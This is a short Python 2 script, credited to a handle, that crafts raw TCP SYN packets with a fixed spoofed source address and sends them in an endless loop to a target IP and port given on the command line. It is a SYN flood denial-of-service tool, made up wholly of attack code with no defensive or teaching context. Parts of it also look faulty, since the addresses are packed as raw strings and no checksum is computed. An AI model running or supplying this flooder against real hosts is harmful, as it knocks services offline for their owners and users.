#!/usr/bin/env python2
#Code by LeeOn123
import socket, sys, threading, random
from struct import *

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

source_ip = "10.0.0.9"
dest_ip = str(sys.argv[1])
while True:
  protocol = socket.IPPROTO_TCP
  check = 10
  ihl_version = (4 << 4) + 5
  ip_header = pack('!BBHHHBBH4s4s', ihl_version, 0, 40, 54321, 0, 255, protocol, 0, source_ip, dest_ip)
  source = random.randint(1024, 65535)
  dest = int(sys.argv[2])
  window = 65535
  offset_res = (5 << 4) + 0
  tcp_flags = 0 + (1 << 1) + (0 << 2) + (0 << 3) +(0 << 4) + (0 << 5)
  tcp_header = pack('!HHLLBBHHH', source, dest, 1000, 0, offset_res, tcp_flags,  window, 0, 0)
  placeholder = 0
  psh = pack('!4s4sBBH', source_ip, dest_ip, 0, socket.IPPROTO_TCP , len(tcp_header));
  psh = psh + tcp_header;
  tcp_header = pack('!HHLLBBHHH',source, dest, 0, 0, offset_res, tcp_flags,  window, 0 , 0)
  packet = ip_header + tcp_header
  s.sendto(packet, (dest_ip , 0))
